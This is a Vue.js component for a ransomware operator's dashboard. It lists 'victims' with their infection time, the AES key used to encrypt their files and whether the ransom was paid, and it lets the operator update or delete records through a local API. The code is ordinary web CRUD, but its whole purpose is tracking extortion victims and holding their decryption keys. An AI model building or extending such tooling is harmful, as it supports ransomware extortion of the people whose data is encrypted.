<template>
  <div class="container">
    <div class="row">
      <div class="col-sm-10">
        <h1>Victims</h1>
        <hr><br><br>
        <alert :message=message v-if="showMessage"></alert>
        <br><br>
        <table class="table table-hover">
          <thead>
            <tr>
              <th scope="col">Victim id</th>
              <th scope="col">Time</th>
              <th scope="col">AES_key</th>
              <th scope="col">Paid?</th>
              <th></th>
            </tr>
          </thead>
          <tbody>
            <tr v-for="(victim, index) in victims" :key="index">
              <td>{{ victim.id }}</td>
              <td>{{ victim.inf_time }}</td>
              <td>{{ victim.AES_key }}</td>
              <td>
                <span v-if="victim.ransom">Yes</span>
                <span v-else>No</span>
              </td>
              <td>
                <div class="btn-group" role="group">
                  <button
                          type="button"
                          class="btn btn-warning btn-sm"
                          v-b-modal.victim-update-modal
                          @click="editVictim(victim)">
                      Update
                  </button>
                  <button
                          type="button"
                          class="btn btn-danger btn-sm"
                          @click="onDeleteVictim(victim)">
                      Delete
                  </button>
                </div>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>
    <b-modal ref="editVictimModal"
            id="victim-update-modal"
            title="Update"
            hide-footer>
      <b-form @submit="onSubmitUpdate" @reset="onResetUpdate" class="w-100">
      <b-form-group id="form-title-edit-group"
                    label="Victim id:"
                    label-for="form-title-edit-input">
          <b-form-input id="form-title-edit-input"
                        type="text"
                        v-model="editForm.id"
                        required
                        placeholder="Enter id">
          </b-form-input>
        </b-form-group>
        <b-form-group id="form-AES_key-edit-group"
                      label="AES_key:"
                      label-for="form-AES_key-edit-input">
            <b-form-input id="form-AES_key-edit-input"
                          type="text"
                          v-model="editForm.AES_key"
                          required
                          placeholder="Enter AES_key">
            </b-form-input>
          </b-form-group>
        <b-form-group id="form-paid-edit-group">
          <b-form-checkbox-group v-model="editForm.paid" id="form-checks">
            <b-form-checkbox value="true">Paid?</b-form-checkbox>
          </b-form-checkbox-group>
        </b-form-group>
        <b-button-group>
          <b-button type="submit" variant="primary">Update</b-button>
          <b-button type="reset" variant="danger">Cancel</b-button>
        </b-button-group>
      </b-form>
    </b-modal>
  </div>
</template>

<script>
import axios from 'axios';
import Alert from './Alert.vue';

export default {
  data() {
    return {
      victims: [],
      addVictimForm: {
        id: '',
        inf_time: '',
        ransom: [],
        AES_key: '',
      },
      message: '',
      showMessage: false,
      editForm: {
        id: '',
        inf_time: '',
        ransom: [],
        AES_key: '',
      },
    };
  },
  components: {
    alert: Alert,
  },
  methods: {
    getVictims() {
      const path = 'http://localhost:5000/victims';
      axios.get(path)
        .then((res) => {
          this.victims = res.data.victims;
        })
        .catch((error) => {
          // eslint-disable-next-line
          console.error(error);
        });
    },
    addVictim(payload) {
      const path = 'http://localhost:5000/victims';
      axios.post(path, payload)
        .then(() => {
          this.getVictims();
          this.message = 'Victim added!';
          this.showMessage = true;
        })
        .catch((error) => {
          // eslint-disable-next-line
          console.log(error);
          this.getVictims();
        });
    },
    initForm() {
      this.addVictimForm.id = '';
      this.addVictimForm.inf_time = '';
      this.addVictimForm.AES_key = '';
      this.addVictimForm.ransom = [];
      this.editForm.id = '';
      this.editForm.inf_time = '';
      // this.editForm.title = '';
      this.editForm.AES_key = '';
      this.editForm.ransom = [];
    },
    // onSubmit(evt) {
    //   evt.preventDefault();
    //   this.$refs.addVictimModal.hide();
    //   let ransom = false;
    //   if (this.addVictimForm.ransom[0]) ransom = true;
    //   const payload = {
    //     title: this.addVictimForm.title,
    //     AES_key: this.addVictimForm.AES_key,
    //     ransom, // property shorthand
    //   };
    //   this.addVictim(payload);
    //   this.initForm();
    // },
    // onReset(evt) {
    //   evt.preventDefault();
    //   this.$refs.addVictimModal.hide();
    //   this.initForm();
    // },
    editVictim(victim) {
      this.editForm = victim;
    },
    onSubmitUpdate(evt) {
      evt.preventDefault();
      this.$refs.editVictimModal.hide();
      let ransom = false;
      if (this.editForm.ransom[0]) ransom = true;
      const payload = {
        id: this.editForm.id,
        // inf_time: this.editForm.inf_time,
        AES_key: this.editForm.AES_key,
        ransom,
      };
      this.updateVictim(payload, this.editForm.id);
    },
    updateVictim(payload, victimID) {
      const path = `http://localhost:5000/victims/${victimID}`;
      axios.put(path, payload)
        .then(() => {
          this.getVictims();
          this.message = 'Victim updated!';
          this.showMessage = true;
        })
        .catch((error) => {
          // eslint-disable-next-line
          console.error(error);
          this.getVictims();
        });
    },
    onResetUpdate(evt) {
      evt.preventDefault();
      this.$refs.editVictimModal.hide();
      this.initForm();
      this.getVictims(); // why?
    },
    removeVictim(victimID) {
      const path = `http://localhost:5000/victims/${victimID}`;
      axios.delete(path)
        .then(() => {
          this.getVictims();
          this.message = 'Victim removed!';
          this.showMessage = true;
        })
        .catch((error) => {
          // eslint-disable-next-line
          console.error(error);
          this.getVictims();
        });
    },
    onDeleteVictim(victim) {
      this.removeVictim(victim.id);
    },
  },
  created() {
    this.getVictims();
  },
};
</script>
